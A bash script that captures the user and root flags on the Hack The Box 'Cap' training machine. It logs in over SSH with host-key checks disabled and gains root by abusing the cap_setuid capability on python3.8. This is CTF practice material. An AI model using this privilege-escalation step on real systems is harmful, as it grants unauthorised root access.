#!/usr/bin/env bash
#
# flags.sh — retrieve user and root flags from HTB Cap
#
# No external dependencies: uses only the ssh client you already have.
# It opens a single SSH session and runs both commands remotely, so you
# type the password just once when prompted.
#
# Usage:   ./flags.sh [target-ip]
# Example: ./flags.sh 10.129.134.144

set -euo pipefail

TARGET="${1:-10.129.134.144}"
REMOTE_USER="nathan"

echo "[*] Target: $TARGET"
echo "[*] Enter the SSH password when prompted (you only type it once)."

# The quoted heredoc (<<'REMOTE') is sent to the remote shell verbatim —
# nothing is expanded locally, so the quotes inside need no escaping.
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    "$REMOTE_USER@$TARGET" 'bash -s' <<'REMOTE'
echo "[+] user.txt: $(cat ~/user.txt)"
# cap_setuid on python3.8 lets us become root and read the file in one process.
/usr/bin/python3.8 -c 'import os; os.setuid(0); print("[+] root.txt:", open("/root/root.txt").read().strip())'
REMOTE
